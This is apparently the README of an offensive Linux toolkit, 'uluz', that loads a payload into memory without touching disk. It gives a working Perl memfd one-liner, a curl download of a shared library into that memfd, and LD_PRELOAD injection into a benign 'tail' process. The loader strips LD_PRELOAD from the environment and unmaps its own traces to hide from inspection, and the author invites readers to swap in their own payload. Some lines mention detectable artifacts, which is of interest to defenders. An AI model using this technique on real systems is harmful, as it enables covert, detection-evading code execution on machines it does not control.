# uluz

A bag of tricks to load a payload into memory without touching disks, by using a
memfd to serve a shared library that loads a SHELF.

* memfd gadget via perl (or python / whatever) that only exists for 5 seconds.
* copy the .so into that via however you want.
* the .so implements a shelf loader for the main binary, allocating in a private
  copy of a normal .so like libc, and removing `LD_PRELOAD` from environ.
  The shelf loader was extended to support more than one `PT_LOAD` to avoid
  `rwx` regions.
* this main binary removes the mapping of the loader .so, leaving a nice clean
  mapping at the end.

## Example

First run `make setup` to setup the patched musl build, then run `make` to
build the shared library you can load.

Then do something like this, starting a HTTP server from `./lib`, so load it:
```
echo '$name = "egg"; $fd = syscall(319, $name, 1); $path = "/proc/" . $$ . "/fd/" . $fd; symlink($path, "/tmp/egg"); chmod 0666, $path; sleep 5; unlink "/tmp/egg"' | perl &
sleep 0.5
curl http://localhost:8000/libfoo.so > /tmp/egg
LD_PRELOAD=/tmp/egg tail -f /dev/null
```

The payload only sends a packet containing "alive" to `udp://localhost:3000`
every few seconds, so change that to want you want.
(Phrack #68-9 for ideas, just be happy you get to write C now :))

(see poc.sh for more details and ideas)

You end up with a `tail` with a `/proc/PID/maps` that looks like:
```
5ed4da4c6000-5ed4da4c8000 r--p 00000000 fc:01 20738387                   /usr/bin/tail
5ed4da4c8000-5ed4da4d2000 r-xp 00002000 fc:01 20738387                   /usr/bin/tail
5ed4da4d2000-5ed4da4d5000 r--p 0000c000 fc:01 20738387                   /usr/bin/tail
5ed4da4d5000-5ed4da4d6000 r--p 0000e000 fc:01 20738387                   /usr/bin/tail
5ed4da4d6000-5ed4da4d7000 rw-p 0000f000 fc:01 20738387                   /usr/bin/tail
5ed51553f000-5ed515560000 rw-p 00000000 00:00 0                          [heap]
718b7c400000-718b7c975000 r--p 00000000 fc:01 20710427                   /usr/lib/locale/locale-archive
718b7ca00000-718b7ca07000 r-xp 00000000 fc:01 20719194                   /usr/lib/x86_64-linux-gnu/libc.so.6
718b7ca07000-718c70c40000 rw-p 00007000 fc:01 20719194                   /usr/lib/x86_64-linux-gnu/libc.so.6
718c70e00000-718c70e28000 r--p 00000000 fc:01 20719194                   /usr/lib/x86_64-linux-gnu/libc.so.6
718c70e28000-718c70fb0000 r-xp 00028000 fc:01 20719194                   /usr/lib/x86_64-linux-gnu/libc.so.6
718c70fb0000-718c70fff000 r--p 001b0000 fc:01 20719194                   /usr/lib/x86_64-linux-gnu/libc.so.6
718c70fff000-718c71003000 r--p 001fe000 fc:01 20719194                   /usr/lib/x86_64-linux-gnu/libc.so.6
718c71003000-718c71005000 rw-p 00202000 fc:01 20719194                   /usr/lib/x86_64-linux-gnu/libc.so.6
718c71005000-718c71012000 rw-p 00000000 00:00 0
718c71146000-718c71149000 rw-p 00000000 00:00 0
718c71186000-718c71188000 rw-p 00000000 00:00 0
718c71188000-718c71189000 r--p 00000000 fc:01 20711446                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
718c71189000-718c711b4000 r-xp 00001000 fc:01 20711446                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
718c711b4000-718c711be000 r--p 0002c000 fc:01 20711446                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
718c711be000-718c711c0000 r--p 00036000 fc:01 20711446                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
718c711c0000-718c711c2000 rw-p 00038000 fc:01 20711446                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffe43391000-7ffe433b3000 rw-p 00000000 00:00 0                          [stack]
7ffe433ed000-7ffe433f1000 r--p 00000000 00:00 0                          [vvar]
7ffe433f1000-7ffe433f3000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

Notice the issue? :)
(it's the two libc alloctions below `locale-archive` btw)

## Notes

When debugging, you want to run the following in your GDB session:
```
set environment LD_PRELOAD=./lib/libfoo.so
set startup-with-shell off
```

## Structure

* `lib` - contains a shared library that implements a SHELF loader and removes
  `LD_PRELOAD` from the environment (not a clean approach! leaves null bytes in
  environ you can detect).
* `payload` - A SHELF that removes mappings with the name "/memfd:egg" and the
  setups up an signal handler for SIGALRM that sends a UDP packet to
  localhost:3000, and makes this run every few seconds.
  The SHELF does its own setup of musl which maybe interesting, and using a
  custom build of musl that removes thread local storage.
* `poc.sh` - just a sample script to run everything. Has some interesting notes
  if you care about some more details.
